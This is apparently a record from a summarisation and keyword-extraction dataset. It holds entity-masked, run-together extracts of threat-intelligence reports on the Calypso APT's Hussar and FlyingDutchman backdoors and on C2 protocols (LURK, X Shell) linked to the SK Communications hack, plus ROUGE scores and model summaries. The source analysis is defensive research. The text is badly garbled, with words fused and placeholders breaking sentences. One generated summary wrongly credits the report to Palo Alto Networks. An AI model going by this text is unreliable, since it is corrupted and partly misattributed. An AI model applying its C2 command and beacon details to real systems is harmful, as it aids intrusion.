[PERSON] RawConfig { } ; _ DWORD protocolId ; _ BYTE c2Strings [ 0x100];The protocolId field indicates the protocol to be used for communicating with C2 . There are a total of [CARDINAL] three possibilities:\u008f\u008f\u008fIf protocolId equals [CARDINAL] 1 , a [ORG] TCP - based protocol will be used . If protocolId equals [CARDINAL] 2 , the protocol will be HTTP - based . If protocolId equals [CARDINAL] 3 , it will be [ORG] HTTPS - based . The time stamp is calculated from the registry from the key SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Telephony ( Perf0 value ) . If reading the time stamp is impossible , \" temp \" is added to the computer identifier . Figure [CARDINAL] 27 . Generating computer ID20Next Hussar creates a window it will use for processing incoming messages . Figure [CARDINAL] 28 . Creating dispatcher windowThen the malware adds itself to the list of authorized applications in [FAC] Windows [FAC] Firewall , using the INetFwMgr COM interface . To complete initialization , Hussar creates a thread which connects to C2 and periodically polls for commands . The function running in the thread uses the WSAAsyncSelect API to notify the window that actions can be performed with the created connection ( socket is \" ready for reading , \" \" connected , \" or \" closed\").Figure [CARDINAL] 29 . Communication between the open socket and the windowIn general , for transmitting commands , the malware uses the window and Windows messaging mechanism . The window handle is passed to the modules , and the dispatcher has branches not used by the stager , so we can assume that the modules can use the window for communication with C2.21ModulesEach module is an [ORG] MZPE file loaded into the same address space as the stager . The module must export the GetModuleInfo function , which is called by the stager after image mapping . IdentifierDirectionTypeDescription0x835From \u04212CommandCollect information on the infected comput- er ( such as OS version , user name , computer name , and string containing current time and processor name based on registry data , plus whether the OS is [CARDINAL] 64 - bit)0x9CA4From \u04212CommandLoad module . Module data comes from [CARDINAL] C20xC358 of these???CommandTransmit data from [ORG] LPARAM to C2???CommandTransmit C2 configuration to the module . [PERSON] Module ID is transmitted to [ORG] LPARAM???CommandTransmit the received packet to the module . [PERSON] Module ID is sent from C222FlyingDutchmanThe payload provides remote access to the infected computer . It includes functions such as screenshot capture , remote shell , and file system operations . It also allows managing system processes and services . It consists of several modules . Module IDCMD IDDirectionTypeDescription0xafc80xAFD3From \u04212Command [PERSON] Module ping0xAFD4From \u04212CommandSends information about the infected comput- er ( such as OS version and installed service packs , processor name , string containing cur- rent time and screen resolution , and informa- tion about free and used disk space)0xAFD5From \u04212CommandSends list of processes running on the system0xAFD7From [PRODUCT] \u04212CommandEnd process . Process [ORG] PID is transmitted from C20xAFD9From \u04212CommandSends list of current windows on the system , along with their titles0xAFDAFrom \u04212CommandSend [GPE] WM_CLOSE message to a specific window0xAFDBFrom \u04212Command [GPE] Maximize window0xAFDCFrom \u04212Command [PERSON] Minimize window0xAFDDFrom \u04212CommandShow window0xAFDEFrom \u04212CommandHide window230xAFE0From \u04212CommandSends list of current services on the system0xAFE1From \u04212CommandModifies the status of an existing service . Service name is obtained from C2 . It can launch a service or change its status to STOP , PAUSE , or [ORG] CONTINUE . C2 indicates which status to change [TIME] to0xAFE2From \u04212CommandDelete existing service . Service name is re- ceived from C20xAFE3From \u04212CommandChange service start type . Service name is received from C20xabe00xABEBFrom \u04212Command [PERSON] Module ping0xABECFrom \u04212CommandLaunch the process for transmitting screen- shots from the infected computer . Screenshots are taken every second0xABEDFrom \u04212CommandPause screenshot capture process0xABF1From \u04212CommandStop taking screenshots . The module stops running0xa7f80xA803From \u04212CommandRun cmd.exe plus a thread , which will read console output data from the related pipe and send it to C20xA804From \u04212CommandWrite command to the pipe linked to [ORG] STDIN of the cmd.exe created previously0xA805From \u04212CommandStop the cmd.exe process and all associated pipes . The module stops running0xa4100xA41BFrom \u04212CommandSends information about system disks and their types240xA41CFrom \u04212CommandSends directory listing . The relevant directory path is obtained via C20xA41EFrom \u04212CommandUpload file from the computer to C20xA41FFrom \u04212CommandRun file0xA420From \u04212Command [ORG] Delete file0xA421From \u04212Command [PERSON] Download file from C20xA424From \u04212Command Move file0xA425From \u04212CommandCreate directory0xA426From \u04212CommandFile Touch0xA428From \u04212CommandSends the size of a file to C2 . File path is passed via C225ConclusionThe group has several successful hacks to its credit , but still makes mistakes allowing us to guess its origins . All data given here suggests that the group originates from [LOC] Asia and uses malware not previously described by anyone . The [PERSON] Byeby trojan links the group to SongXY , encountered by us [ORG] Positive [ORG] TechnologiesPositive [ORG] Technologies is a leading global provider of enterprise security solutions for vulnerability and compliance manage- ment , incident and threat analysis , and application protection . Commitment to clients and research has earned [WORK_OF_ART] Positive Tech- nologies a reputation as one of the foremost authorities on [ORG] Industrial [ORG] Control [ORG] System , Banking , Telecom , Web Application , and ERP security , supported by recognition from the analyst community . [ORG] Learn more about Positive Technologies at ptsecurity.com.ptsecurity.com info@ptsecurity.com \u00a9 2019 Positive Technologies . Positive Technologies and the Positive Technologies logo are trademarks or registered [MONEY] trade- [MONEY] marks of [ORG] Positive [ORG] Technologies . All other trademarks mentioned herein are the property of their respective owners . Calypso APT_A4.ENG.0002.02", "generated_text": "Palo Alto Networks; at least September 2016; governmental institutions; Brazil; India; Kazakhstan; Russia; Thailand; Turkey; the group; lateral movement; Calypso RAT; PlugX; The Byeby trojan; China Telecom; the IP; the real IP address; the threat actors; Asian origin; the group; the malware.", "ref_text": "<START-1>The document describes an advanced persistent threat (APT) group named Calypso that has been active since at least September 2016. Calypso targets government institutions in several countries, including Brazil, India, Kazakhstan, Russia, Thailand, and Turkey, with the goal of stealing confidential data. The report provides an analysis of the tactics, techniques, and procedures used by Calypso. The group typically gains initial access by exploiting vulnerabilities or guessing default credentials to upload a web shell. They then use publicly available tools like Mimikatz for lateral movement and credential access. Custom malware like Calypso RAT, PlugX, and a modified Byeby trojan are deployed on compromised hosts for command and control. Detailed analysis is provided on the Calypso RAT malware, including its dropper, installation script, shellcode, commands, modules, and network communication. Variants using different payloads like Hussar and FlyingDutchman are also examined. Evidence suggests the Calypso group originates from Asia, based on IP addresses traced back to China Telecom, artifacts in scripts and configuration files, and the use of PlugX malware associated with Asian APTs. Links to the SongXY group are noted but inconclusive. The report concludes with indicators of compromise and maps Calypso's tactics to the MITRE ATT&CK framework technique IDs. In summary, Calypso is an active, stealthy threat group that continues to target government institutions to steal confidential data using custom malware and tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5626598465473145, "gpt3/lexical/rouge_rouge2": 0.22107969151670953, "gpt3/lexical/rouge_rougeL": 0.3478260869565218, "gpt3/lexical/rouge_rougeLsum": 0.3478260869565218, "gpt3_generated_text": ["This article from Palo Alto Networks provides an overview of an APT group that has been active since at least September 2016 and primarily targets governmental institutions in Brazil, India, Kazakhstan, Russia, Thailand, and Turkey. The group uses various malware, including Calypso RAT, PlugX, and the modified version of the Byeby trojan. The attackers gain access to internal networks by exploiting vulnerabilities or using default credentials for remote access. They perform lateral movement using publicly available utilities and TCP Port Scanner EternalRomance. The group stores malware and utilities in specific locations on compromised computers and spreads within the network by exploiting vulnerabilities or using stolen credentials. The article also discusses evidence that suggests the group is of Asian origin, including the use of a non-anonymous proxy server with an IP address belonging to China Telecom. System artifacts and utility configurations also indicate the group's Asian origins. Overall, the malware and network infrastructure used by the group align with previous APT groups of Asian origin."]}, {"split_name": "val", "sample_id": "val_101", "prompt_text": "Extract the keywords: CommandandControlintheFifthDomainCommandFivePtyLtd February2012ABSTRACTThis \t paperpresentsthefindingsof \t anextensiveinvestigationinto commandandcontrolinfrastructureusedbyanAdvancedPersistent Threat . \t Findingsincludetechnicaldetailsof \t malicioussoftware , \t and associated \t command \t andcontrolprotocols . \t [PERSON] Thesefindingsaredrawn upontoidentify \t modusoperandi \t and \t demonstratelinksbetweena [CARDINAL] numberof \t majortargeted \t attacksincluding \t therecentSykipot \t attacks , theJuly \t [DATE] 2011 \t SK \t Communicationshack , \t theMarch \t [DATE] 2011 \t [ORG] RSA \t breach , and \t theseriesofcoordinated \t cyberattacksdubbedNightDragon . Themalwareused \t intheattackwasprogrammed to \t [ORG] communicatewithseveral\u2018callback\u2019domains . The malwarelocateditsC2server(s)byresolvingthese domains into \t IP \t addresses using \t the ubiquitous Domain Name System ( [ORG] DNS ) [CARDINAL] 3protocol . These communicationsaredepicted \t inFigure1.1.Computer infected withmalware2.3 . 4.WARNINGBACKGROUNDThis \t paperdiscussesmaliciousactivity \t and \t identifies InternetProtocol(IP)addresses , \t domainnames , and websites that \t may \t contain malicious content . For safety \t reasonstheselocationsshouldnot \t beaccessed , scanned , probed , \t orotherwiseinteracted \t withunless theirtrustworthinesscanbeverified . On28 \t [DATE] July \t 2011 \t SKCommunicationsannounced \t it had \t beenthesubjectof \t ahackwhich \t resulted \t inthe theft \t of \t the personal details of \t up \t to \t [CARDINAL] 35 [CARDINAL] million people1 . \t The attackers infected a number of \t SK Communicationscomputerswith \t malicioussoftware ( malware)and , byissuingcommandand \t control(C2 ) instructionstothemalware , wereableto \t gainaccess to , \t and \t exfiltratelargequantitiesof \t data . \t [PERSON] Theattack itself \t wascomplex , \t wellplannedandlikely \t partofa broader , concertedhackingeffortattributableto \t an Advanced \t Persistent \t Threat2 . [CARDINAL] 1Fordetails \t ofthehack \t refertotheCommand \t Fivepaper\u2018SK \t [PERSON] Hack byanAdvanced \t PersistentThreat\u2019.(Command \t FivePtyLtd,2011 ) [CARDINAL] 2Foradefinitionoftheterm\u2018Advanced \t PersistentThreat \u2019 \t referto theCommandFivepaper\u2018Advanced \t PersistentThreats : ADecade inReview\u2019.(CommandFivePtyLtd,2011)DNS serverCommand and The [ORG] DNS server advises that the callback domain is located at [ORG] IP address x.x.x.x . The malware communicates with the [CARDINAL] C2 server located at [ORG] IP address x.x.x.x to obtain [CARDINAL] C2 instructions and/or to send a response . The [CARDINAL] C2 server provides additional C2 instructions to the malware . [PERSON] FIGURE1 : DEPICTIONOFCOMMUNICATIONS 3DNSis \t fundamental \t ontheInternet . Itisaformofdirectory assistancetohelpcomputers \t communicatewith \t othercomputers . Itsuseisanalogoustoapersoncalling \t directoryassistancetofind outwhatphonenumbertodial \t tospeak \t toacertainperson . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE1OF \t [CARDINAL] 29THE VICTIMSintointrusionsubdomainsOneof \t thecallbacklocationsused \t intheSK Communications hack was \u2018 update.alyac.org \u2019 . \t The domainwasregistered \t [ORG] on24 \t [PERSON] September2010 \t using registrationinformationalmost \t identicalto \t that \t of \t a legitimatecompany \t \u2013 atacticused \t by \t theattackeron Communicationsnetworkit \t becamewidely \t known that \t the domain was being used for malicious purposes , \t andperhaps \t forthisreason , \t theoneyear registrationwasnotrenewed \t by \t theattacker . \t Despite this , \t anumberof \t victims \t aroundtheworld \t continued to \t usethedomainto \t locatetheirC2 \t server , \t resulting inattempted \t communicationsto \t aC2 \t serverthat \t no longerexists . Computersusing \t IP \t addressesallocated \t to \t [GPE] France , thePeople\u2019sRepublicof \t [GPE] China , \t [GPE] Portugal , \t [ORG] SouthKorea , [GPE] Taiwan , \t theUnited \t [GPE] Kingdom \t and \t theUnited \t [GPE] States areamong \t thosethat \t attempted \t to \t communicatewith While some of these computers belong to security researchers who deliberately installed malware for research \t purposes , \t most \t are victims compromised \t by \t the attacker either directly \t or indirectly . The victims are from a variety of industries including \t the technology \t sector , \t high precisionmanufacturing , \t research \t and \t development , testing \t and certification , \t global market research , [CARDINAL] Eight \t different \t types of [CARDINAL] C2 \t communications were to \u2018 alyac.org \u2019 observed compromised computers . These \u2018 DB \u2019 , \t and \t \u2018 Qdigit \u2019 \u2018 Oscar \u2019 which \t are believed \t to \t be associated \t with \t thesamemalware . \t [NORP] Noothervictims were observed communicating with [CARDINAL] 4Other domains registered using a similar tactic include \u2018 nprotects.org \u2019 , and \u2018 trendmicros.net \u2019 . ( [ORG] Command \u2018 bomuls.com \u2019 , FivePtyLtd,2011)THE COMMUNICATIONSTHE \u2018 LURK \u2019 COMMUNICATIONSAsinglecomputerwasobserved \t communicating \t with thecallbackdomain\u2018path.alyac.org\u2019onTransmission ControlProtocol(TCP)80viathe\u2018LURK\u2019protocol . The communications contained a [CARDINAL] 15 byte header followedbydatacompressed \t usingtheDEFLATE5 compression method . The header contained a protocolidentifier , sizeand \t compressioninformation LURK \t protocol \t identifier . Hexadecimalbytes \t \u2018 0x4C \t 0x550x52 0x4B \u2019 \t ( or\u201cLURK\u201dinASCII Hexadecimalbyte\u20180x30\u2019(\u201c0\u201d)inall bytes \t \u2018 0x780x9c\u20197inallobserved communications , denoting \t thatthe DEFLATEcompressionmethod \t was used \t tocompressthedata(witha * ALL \t VALUES \t ARE \t LITTLE ENDIAN \t UNLESS \t OTHERWISE \t STATED . [CARDINAL] TABLE1 : LURKPROTOCOLFORMAT The decompressed data reveals information about \t thecompromisedcomputersuch \t asits \t name , computerspecificationsand \t operating \t system \t ( OS ) informationasshowninTable2 . \t Forexample , it \u2018 path.alyac.org \u2019 5TheDEFLATEcompressionmethod \t is \t specified \t inRFC1951 . ( [ORG] Deutsch , [ORG] ZLIB \t CompressedDataFormatSpecificationversion3.3 , [DATE] 1996 ) 7As \t described \t inSection2.2 \t ofRFC1950,bits \t 0 \t to3 \t inthefirst byteoftheZLIB \t streamheaderrepresentthecompressionmethod used , and \t bits \t 4 \t to8representcompressioninformation . The [ORDINAL] second \t byteintheheadercontains \t bitsforanintegritycheck , along \t with \t twoadditional \t flags . With \t asecond \t byteof\u20189c \u2019 \t the integritycheck \t passes \t ( as30876 \t is \t divisible \t by31),thepreset dictionaryflagisnotset , andthecompressionlevel \t flag \t indicates thatthedefaultalgorithmwasused \t forcompression.(Deutsch , [ORG] ZLIB \t Compressed \t DataFormatSpecificationversion3.3 , \t 1996)thatCOPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE2OF \t [CARDINAL] 29OFDESCRIPTION * Possibleprotocolidentifier . Fixed \t bytes \t \u2018 0x82 \u2018 0x00 \u2019 \t bytes \t inallobserved \t communications . \u2018 0xD0 \u2019 \t inallobserved \t communications . Null terminated \t computername . \u2018 0x00 \u2019 \t bytes \t inallobserved \t communications . Null terminated \t accountname . Horizontal \t screenresolution(pixels ) . Vertical \t screenresolution(pixels ) . Null terminated \t string \t containing \t amountof memoryand \t unitofmeasurement(e.g . * ALL \t VALUES \t ARE \t LITTLE ENDIAN \t UNLESS \t OTHERWISE \t STATED . communications9are known to be Similar generated \t by \t malwarethatcommunicateswith \t the callback domain \u2018 office.windowupdate.org \u2019 domainthat \t is \t linked \t to \t \u2018 alyac.org\u2019notonly \t by \t the communicationsprotocolbut \t also \t by \t both \t domain registrationtacticand \t infrastructure . The domain \u2018 windowupdate.org \u2019 administrativeaddressand \t contact \t informationlisted inthedomainregistrationis \t identicalto \t that \t listed \u2018 windowsupdate.com\u201910 . \t Thisis \t thesametacticused by \t theattackerwith \t registrationof \t \u2018 alyac.org\u201911 . major and \t minor version numbers , a build number , platform identifierand \t informationaboutproductsuites \t and \t thelatest [DATE] ServicePackinstalled.(MicrosoftCorporation,2011 ) [CARDINAL] 9Themalware\u2018Troj / Agent UDR \u2019 \t with \t MD5 \t hash\u201842377E724875 2912 5EBE 7C95 02B9 4CD7 \u2019 generate is known to communications \u2018 LURK0\\xAC\\x01 \u2019 , \u2018 LURK0\\B3\\x01 \u2019 \u2019 LURK0\\xAD\\x01 \u2019 , \u2018 LURK0\\xB5\\x01 \u2019 . and ( Sophos \t Ltd. ,2011 ) 10The legitimate domain \u2018 windowsupdate.com \u2019 is used by [PERSON] Microsofttodeliverupdates \t totheWindowsOS . 11Thedomain\u2018alyac.org\u2019was \t registeredusing \t registrationdetails thatmade \t thedomainappearas \t though \t itwas \t associated \t with \t the legitimate , trusted \t entityESTsoft \u2013 theproducerofALYacantivirus software.(Command \t FivePtyLtd , \t [CARDINAL] 2011)to \u2018 Microsoft legitimatetheThe domain \u2018 windowupdate.org \u2019 previously anIPaddresstowhich \t \u2018 alyac.org\u2019also \t previously pointed . This \t shared \t infrastructurefurthersuggests that \t theobservedcommunicationsto \t \u2018 path.alyac.org \u2019 and \t thoseto \t \u2018 office.windowupdate.org\u2019may \t belinked \u2018 office.windowupdate.org \u2019 communications sent \t to was signed using \t a compromised code signing certificatebelongingto \t YNKJapanInc \t \u2013 aproducerof onlinegames . \t Thesamecertificatehasbeenused \t ina numberofattacksincluding \t by \t [LOC] Hupigonmalware12 and malware similar to that used in the SK Communicationshack . \t Detailsof \t thecompromised code signing \t certificate are shown in Figure [CARDINAL] 2 . Nov27,2009 \u2013 Nov272011 Validity(GMT ): DigitalID \t Class3 \u2013 SoftwareValidation DigitalID \t Class3 \u2013 Microsoft \t Software revoked \t on29 \t July \t [DATE] 2011 \t but , \t asthemalwarewas signed \t on3 \t July \t 2010 \t andtherevocationwasnot activeforsoftwaresignedbefore29July \t [DATE] 201113 , \t the certificate continued to \t validate for this malware aftertherevocation . \t ( [PERSON] Fagerland , \t [DATE] 2011 ) [PERSON] Thedateof \t effectoftherevocationhassince beenbackdatedtoprevent \t thismalware\u2019scertificate fromvalidating14 . \t Thenewdateofeffectstillmay \t not prevent \t the validation of all malware using \t this compromised \t codesigning \t certificate . [CARDINAL] 12Hupigonis \t aremoteadministrationtoolfromChina . Ithas rootkit functionality , can log user activity and establishes outbound \t communications \t toaC2 \t server.(F SecureCorporation ) 13Therevocationisactivefromthe\u2018revocationDate\u2019(inthis \t case , 29July2011)specified \t intheCertificateRevocationList . 14Therevocationforthecompromised \t codesigningcertificatehas beenbackdated \t to [CARDINAL] 12 \t April \t 2010 \t so thattheearliest known malwaresigned \t with \t itnolongervalidates.(Verisign,2011)COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE3OF \t 29THE \u2018 X SHELL \t C601 \u2019 COMMUNICATIONSNumerous compromised \t computerscommunicated with \u2018 path.alyac.org \u2019 on [ORG] TCP port [CARDINAL] 443   a port commonly \t used \t for SSL . These communications , however , \t were not \t SSL but \t instead \t unencrypted communicationslikely \t generated \t by \t aversionof \t the [ORG] AdministrationTool(RAT)15 . communications , \t and \t the information they reveal about \t thecompromised \t computer , \t is \t showninTable [CARDINAL] 3 . \t The\u2018C\u2019immediately \t preceding \t the\u2018601\u2019inthe communications is believed \t to indicate that \t the malwareis \t not \t afreeversionbut \t instead \t acustom , \t or commercial , \t versionof \t theX Shell601 \t [ORG] RAT . \u2018 0x00 \u2019 \t bytes \t inallobserved \t samples . 0 Tick \t count(numberofmilliseconds [CARDINAL] 8 sincesystemwas \t started \t \u2013 resets \t after [CARDINAL] 49.7 \t days ) . [CARDINAL] 12 \u2018 0x00 \u2019 \t bytes \t inallobserved \t samples . Null terminated \t username(if Null terminated \t computername(if \u2018 0x00 \u2019 \t bytes \t inallobserved \u2018 0x00 \u2019 \t bytes \t inallobserved \t samples . Tick \t count(repeated ) . Unknown . Mainly\u20190x00\u2019bytes \t in observedcommunications . * ALL \t VALUES \t ARELITTLE ENDIAN \t UNLESS \t OTHERWISE \t STATED . TABLE3 :X SHELLC601COMMUNICATIONFORMAT 15TheX ShellRATis \t commercial \t software.(XTiger , Xdoors.net , [DATE] 2011 ) 16The SYSTEM_INFO structure contains information about a computersuch \t as \t its \t architecture , typeofprocessorand \t numberof processors \t used.(MicrosoftCorporation,2011 ) 17A locale is a collection of language related user preference informationthattypicallyidentifies \t auser \u2019s \t countryand \t dialect . ( MicrosoftCorporation,2011)In \t all observed \t communications the process namelistedat \t byte288was\u2018svchost.exe\u201918 . \t Based \t on this , \t the malware has likely \t modified the system registry \t onthecompromised \t computersinsuch \t a way \t that \t theRAT \t getsexecutedasaserviceby \t the trusted \t process\u2018svchost.exe\u2019each \t timethecomputer is \t started . \t This \t processname , \t along \t withthecallback location , \t is \t configurable , \t and \t canbeconfigured \t after theRAThasbeencompiled \t into \t executableform . WhileX [PERSON] Shellsupportsnumerousversionsofthe [PERSON] WindowsOS(includingWindowsXP , \t [ORG] Vista , \t Windows 7 , \t and \t Windows \t 2000,2003 \t and \t 2008 \t server both [CARDINAL] 32 \t and \t 64 \t bit \t versions ) , \t only \t computersrunning Windows XP were observed \t communicating \t with \u2018 path.alyac.org \u2019 . The functionality of the [ORG] RAT \t depends \t on the version , \t releasenumber , \t pluginsinstalled \t and \t theOS onwhich \t theRAT \t isinstalled19 . \t Severalversionsof theX ShellRAT \t exist , \t includingafreeversionand \t a \u2018 spy\u2019version20 . \t ThefreeversionoftheRAT \t is \t no longer available for download \t from \t the XDoors website , \t however , \t development of \t the software continues21 . \t Current \t releasenumbersof \t theX [ORG] Shell RAT \t include601 \t and \t [CARDINAL] 603.Previousreleasesdate backto \t at \t least \t [DATE] 200622 . versionsof \t theRATincluding \t theabilityto \t start \t a command shell , control processes and services , upload / download \t files , \t terminateTCP \t connections , createuseraccounts , \t retrievesystem \t information , \t log useractivity(viaakeylogger ) , \t modifytimestamps \t on files , \t conduct process injection , conduct denial of service attacks and shutdown or computer . [ORG] Commands supported by [ORG] the [ORG] X [ORG] Shell softwarearelisted \t inAnnexC. \t ( [ORG] XTiger ) [CARDINAL] 18Theprocess \t \u2018 svchost.exe \u2019 \t isagenerichostprocessforservices which \t [ORG] runfromDLLs.(Microsoft , AdescriptionofSvchost.exein WindowsXP \t ProfessionalEdition2007 ) [CARDINAL] 19Notallfeatures \t aresupported \t ineach \t OS.Forexample , raw [CARDINAL] 20Versions \t ofX Shellincludea\u2018personal\u2019edition , a\u2018mini\u2019version , an\u2018advanced \u2019 \t version , [PERSON] a\u2018spy\u2019versionand \t an\u2018enterprise\u2019version . ( XTiger Crackersoftware,2011 ) 21Duetotheauthorwantingtoavoid \t \u201c unnecessarytrouble\u201d,asof 16March2011,thefreeversionoftheX ShellRAT(and \t alsoits sisterproducttheX DoorRAT)is \t nolongeravailable \t fordownload from the \u2018 xdoors.net \u2019 webpage , however , an online forum containing \t alistofchanges \t madetotheRATcontinues \t tobe updated . ( [ORG] XTiger , forum.xdoors.net . Topic : X Door / X Shell free download \t paused,2011 ) [CARDINAL] 22Previousreleases \t ofX Shellinclude \t releasenumbers323,325 , [CARDINAL] 327 , \t 329,331,333,335 \t and \t [CARDINAL] 337.(XTiger,2010 ) COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.SIZE 300functionality comesstandardPAGE4OF \t [CARDINAL] 29itsspecifyconnectionTheRATis \t VirtualMachine(VM)aware , \t proxy awareand \t canalso \t useaspecified \t [ORG] DNS \t serverto resolvecallbackdomains . \t Someversionshaverootkit functionality \t and \t canavoid \t detectionbyantivirus software . \t [ORDINAL] Third party \t pluginscanbedeveloped \t and anSMS \t notificationservice , \t and \t functionality \t that enablesthecompromisedcomputertobeusedas part \t of \t a botnet \t to \t send \t spam \t or to \t conduct distributeddenialof \t serviceattacks . \t This \t broadrange of \t functionality \t makesthesoftwarefitforanumber of \t purposesand \t reflectsthecommercialnatureofthe software . \t ( [ORG] XTiger ) [WORK_OF_ART] The [WORK_OF_ART] X [WORK_OF_ART] Shell [WORK_OF_ART] RAT is generated by [ORG] the [ORG] X [ORG] Shell [ORG] ControlProgram \t  thesameprogramfromwhich \t the malwareis \t controlled . Thecontrolprogram \t canbe run in either [LANGUAGE] Chinese language mode or [LANGUAGE] English languagemode , \t andallowsthemalwaretobeeasily configured . \t It \t providesoptionstodigitally \t signthe ( connect / listen / sniff ) , \t installthemalwareinoneof severalcovertmanners , \t recovertheSystem \t Service Dispatch \t Table(SSDT)23beforeinstallation , \t and \t abort installationifavirtualmachineis \t detected.(XTiger ) When [PERSON] X [PERSON] Shell malware is generated , \t and \t the \u2018 connect\u2019connectionmode24selected , \t themalwareis configured with \t a static C2 \t host \t ( IP \t address or callbackdomain)and \t controlport . \t Additionally , \t an optioncanbeselectedduring \t thegenerationprocess to \t actively \t notifythemalwareof \t anew \t C2host \t and portviaaconfigurationwebpage25 . \t If \t thisoptionis selected , \t the malware communicates with both \t a configurationwebpage , and \t [NORP] aC2serverat \t regular intervals . \t [PERSON] Theintervalforeach \t canbeseparately configured to a value of [CARDINAL] between [CARDINAL] 30 [CARDINAL] and [CARDINAL] 3600 seconds \t ( inclusive ) . \t ( [ORG] XTiger ) TheX ShellRATs \t that \t communicated \t with \t theC2 host \t \u2018 path.alyac.org\u2019hadbeenconfiguredtousea36 [ORDINAL] second \t interval . \t It \t is \t not \t knownwhetherthemalware was configured \t solely \t with \t a static C2 \t host \t or 23The [ORG] SSDT is \t often used \t by kernel \t mode \t rootkits \t to evade detection . 24Inthe\u2018connect \u2019 \t mode \t themalwareattempts \t tocommunicate withits \t C2 \t server , asopposedtothe\u2018listen \u2019 \t modeinwhichitwaits [PERSON] foraC2 \t servertoattempttoconnecttoit . [CARDINAL] 25Theconfigurationwebpageis \t oftennamed \t \u2018 xcip.asp \u2019 \t and \t canbe generated \t and \t uploaded \t fromwithinthecontrol \t program . \u2018Xcip \u2019 \t is presumably \t an acronym for \u2018 X door Configure IP \t address \u2019 \t or something \t similar . X Shell Configuration Webpageswhetherthemalwarealso \t retrievesits \t [GPE] C2hostand portfrom \t aconfigurationwebpage . X Shellconfigurationwebpagescontain , inencoded form , a colon separated \t IP \t address ( or callback domain ) and port for the malware to use to communicate with \t its C2 \t server . The encoded [ORG] IP address(orcallbackdomain)and \t controlport \t canbe decoded \t onebyteat \t atimeusing \t theformula : di= \t ei\u2013((i%8)+x ) , wherei \t is \t thebyteindex , \t di \t is \t thedecoded \t byte , \t eiis theencoded \t byteand \t x \t isaonebytekey . Thisis \t the equivalent \t of \t subtracting \t both \t thekey \t and \t thebyte positionnumber[0 7 ] \t fromeach \t byte . \t [LOC] Theposition numberis \t modulo \t [CARDINAL] 8i.e . \t repeatsevery \t 8bytes . For example , \t if \t the compromised \t computers received \t a C2 \t host \t of \u2018 PATH.ALYAC.ORG \u2019 and \t a controlport \t of \t [CARDINAL] 443 \t from \t aconfigurationwebpage , and \t akey \t of \t 0x16 \t ( [CARDINAL] 22 \t indecimal)wasused \t to \t encode [ORG] HyperText \t [CARDINAL] TransferProtocol(HTTP ) \t POST \t \u2018 Update ? \u2019 \u2018 path.alyac.org \u2019 and requests were sent \t to both \u2018 update.alyac.org \u2019 from compromised computers . [CARDINAL] Two request \t formats were observed ; Variant \t A ( showninFigure3)inwhich \t thefilepath \t requested was \u2018 /update?product = windows \u2019 , and Variant B ( showninFigure4)inwhich \t thefilepath \t requested was\u2018/update?id = number \u2019 , \t where number \t refersto \t an [CARDINAL] eight digit hexadecimal number that changes betweenrequests . \t Thedomain\u2018path.alyac.org\u2019only received \t Variant \t Brequests , \t whilebothvariantswere sentto \t \u2018 update.alyac.org\u2019 . THE \u2018 UPDATE ? \u2019 COMMUNICATIONSCOPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE5OF \t [CARDINAL] 29POST /update?product = windows [PRODUCT] HTTP/1.1 [PRODUCT] Accept : * / * X - Session : 0 X - Status : 0 X - Size : 61456 X - Sn : [CARDINAL] 1 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1;SV1 ; Host : update.alyac.org Content - Length : 0 Connection : Keep - Alive Cache - Control : no - cache Cookie : VisitorID = c2a4b456 - e11e-4c37 - 88d8- e770aa88058d&Exp=9/25/2014 6:14:17 AMFIGURE3 : [ORG] VARIANTACOMMUNICATIONS \ufffd Backdoor : Win32 / Thoper . [ORG] A29 , [GPE] Trojan . Downloader : Win32 / ThoperB30 . Theobserved \t communicationstothe\u2018alyac.org \u2019 subdomainsalloccurredonTCPport80,however , a variety \t of \t ports(TCP \t ports8080 , \t [CARDINAL] 443 , \t [DATE] 12345 \t etc . ) havebeenused \t bythisparticularfamily \t ofmalware forsimilarrequests . \t [GPE] Theport \t useddependsonhow thecomputerswerepowered \t on . \t Forexample , \t one computer connected at [CARDINAL] 16 \t [ORDINAL] second intervals and another approximately \t every 200 seconds \t ( \u00b115 seconds ) . \t ThreeHTTP \t [ORG] POST \t requestsweresubmitted during \t each \t connection , each \t approximately \t one secondapart . Thefollowingmalformeduser agent31is \t present intheHTTP \t POST \t requestsof \t both \t variants(spaces shownhereas \u2018 \u00b7 \u2019 ): \u2018 Mozilla/4.0\u00b7(compatible;\u00b7MSIE\u00b76.0;\u00b7Windows\u00b7NT \u00b7 [DATE] 5.1;SV1 ; \u2019 This \t user agent \t is \t consistent with that \t which may \t begeneratedby \t version6.0oftheMicrosoft Internet Explorer web browser running on the Microsoft \t Windows \t XP \t OS , \t except \t that \t it \t is \t missing \t a closing \t bracket \t afterthelast \t semicolonandaspace afterthesecondtolast \t semicolon . [NORP] Thismalformed user agent \t is \t hardcoded \t into \t themalwareand \t canbe used \t asasignaturetodetect \t thecommunications . [CARDINAL] Four custom headers are also \t present in the HTTPrequests : \t \u2018 X Session \u2019 , \t \u2018 X Status \u2019 , \t \u2018 X Size \u2019 , \t and\u2018X   Sn\u2019 . ForsomemalwareintheDestory \t [ORG] RATfamily \t not 29TheDestoryRATwith \t MD5 \t hash\u20185FCE1FC1 \t 8283D76C \t 396A 3CCC 64BD [ORG] BBDE \u2019 \t is detected by antivirus software as both [ORG] Backdoor . Soguand \t Backdoor : Win32 / Thoper . A.This \t malicious \t file is \t identical \t tothatused \t intheSK \t Communications \t hack \t exceptfor itsconfiguration.(HispasecSistemas,2011 ) 30TheDestoryRATwith \t MD5 \t hash\u2018754364D9 \t DB702DC71532 7B40 BF97 E556 \u2019 \t is detected \t by antivirus \t software as both [ORG] TrojanDownloader : Win32 / Thoper . [PERSON] B. ( HispasecSistemas,2011 ) [CARDINAL] 31User agents are used in HTTP communications to tell webserverswhich \t [ORG] OSand \t webbrowsertheirclients \t areusing , so theycanservecompatiblewebpages . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t 